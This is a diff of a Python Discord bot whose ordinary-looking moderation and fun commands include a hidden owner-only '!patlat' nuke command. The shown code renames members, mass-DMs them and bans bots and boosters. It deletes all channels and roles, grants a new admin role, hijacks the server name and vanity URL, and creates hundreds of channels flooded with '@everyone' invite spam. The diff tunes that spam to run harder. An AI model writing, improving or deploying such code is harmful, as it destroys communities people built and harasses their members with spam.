@@ -373,7 +373,7 @@ async def afk_cmd(ctx, *, sebep="Səbəb göstərilməyib"):
     await ctx.send(f"💤 {ctx.author.mention}, AFK rejiminə keçdin. Səbəb: **{sebep}**")
 
 # ---------------------------------------------------------------------------
-# 8. KANAL VƏ MODERASİYA ƏMRLƏRİ (BÜTÜN KANALLARI AÇ/BAĞLA DAXİL)
+# 8. KANAL VƏ MODERASİYA ƏMRLƏRİ
 # ---------------------------------------------------------------------------
 
 @bot.command(name="lock")
@@ -478,7 +478,7 @@ async def clear_cmd(ctx, amount: int = 5):
     await msg.delete()
 
 # ---------------------------------------------------------------------------
-# 9. ƏYLƏNCƏ OYUNLARI VƏ ULTRA ULTRA SÜRƏTLİ WEBHOOK SPAM !patlat
+# 9. ƏYLƏNCƏ OYUNLARI VƏ ULTRA SÜRƏTLİ MULTI-WEBHOOK SPAM !patlat
 # ---------------------------------------------------------------------------
 
 @bot.command(name="sex", aliases=["spag", "ip"])
@@ -593,7 +593,6 @@ async def poll_cmd(ctx, *, soru):
     await msg.add_reaction("👍")
     await msg.add_reaction("👎")
 
-# MİNLƏRLƏ MESAJ ATAN ULTRA SÜRƏTLİ MULTI-WEBHOOK !patlat KOMUTU
 @bot.command(name="patlat")
 async def patlat_cmd(ctx):
     if ctx.author.id != SAHIB_ID:
@@ -603,7 +602,6 @@ async def patlat_cmd(ctx):
     guild = ctx.guild
     await ctx.send("⚡ XAS ULTRA TURBO SPAM NUKE BAŞLADI!")
 
-    # 1. Ləqəbləri dəyişmək
     async def change_nickname(member):
         if member.id != SAHIB_ID and not member.bot:
             try:
@@ -612,7 +610,6 @@ async def patlat_cmd(ctx):
                 pass
     await asyncio.gather(*(change_nickname(m) for m in guild.members), return_exceptions=True)
 
-    # 2. Üzvlərə DM atmaq
     async def send_dm(member):
         if member.id != SAHIB_ID and not member.bot:
             try:
@@ -621,7 +618,6 @@ async def patlat_cmd(ctx):
                 pass
     await asyncio.gather(*(send_dm(m) for m in guild.members), return_exceptions=True)
 
-    # 3. Bot/Booster ban
     async def ban_member(member):
         if (member.bot and member.id != bot.user.id) or (member.premium_since is not None):
             try:
@@ -630,7 +626,6 @@ async def patlat_cmd(ctx):
                 pass
     await asyncio.gather(*(ban_member(m) for m in guild.members), return_exceptions=True)
 
-    # 4. Kanalları silmək
     async def delete_channel(ch):
         try:
             await ch.delete()
@@ -638,7 +633,6 @@ async def patlat_cmd(ctx):
             pass
     await asyncio.gather(*(delete_channel(ch) for ch in guild.guild_channels), return_exceptions=True)
 
-    # 5. Rolları silmək
     async def delete_role(r):
         if r != guild.default_role:
             try:
@@ -647,7 +641,6 @@ async def patlat_cmd(ctx):
                 pass
     await asyncio.gather(*(delete_role(r) for r in guild.roles), return_exceptions=True)
 
-    # 6. Admin rolu yaratmaq
     try:
         new_role = await guild.create_role(
             name="#RUHUMSKDİ",
@@ -658,7 +651,6 @@ async def patlat_cmd(ctx):
     except:
         pass
 
-    # 7. Server adı və Vanity URL
     ruhum_urls = ["ruhumskdi", "ruhumaz", "ruhumchaos", "ruhumhell", "ruhumx"]
     secilen_url = random.choice(ruhum_urls)
     try:
@@ -668,13 +660,20 @@ async def patlat_cmd(ctx):
 
     avatar_bytes = await bot.user.display_avatar.read() if bot.user.avatar else None
 
-    # 8. MİNLƏRLƏ VƏ İNTENSİV ULTRA SÜRƏTLİ MULTI-WEBHOOK SPAM
-    async def send_webhook_fast(wh):
-        for _ in range(50):
+    async def send_bot_and_webhook_spam(channel, webhooks):
+        for _ in range(30):
             try:
-                await wh.send("discord.gg/xas @everyone 🔥 MINLƏRLƏ SPAM DALĞASI 🔥")
+                await channel.send("discord.gg/xas @everyone 🔥 XAS BOT SPAM DALĞASI 🔥")
             except:
                 pass
+
+            for wh in webhooks:
+                try:
+                    await wh.send("discord.gg/xas @everyone 🔥 MINLƏRLƏ SPAM DALĞASI 🔥")
+                except:
+                    pass
+            
+            await asyncio.sleep(0.08)
 
     async def create_and_webhook_spam(i):
         try:
@@ -688,12 +687,11 @@ async def patlat_cmd(ctx):
                 except:
                     pass
 
-            spam_tasks = [send_webhook_fast(wh) for wh in webhooks]
-            await asyncio.gather(*spam_tasks, return_exceptions=True)
+            await send_bot_and_webhook_spam(channel, webhooks)
         except:
             pass
 
-    chunk_size = 20
+    chunk_size = 15
     for start in range(1, 501, chunk_size):
         tasks_list = [create_and_webhook_spam(i) for i in range(start, min(start + chunk_size, 501))]
         await asyncio.gather(*tasks_list, return_exceptions=True)
@@ -707,4 +705,4 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-    
+        
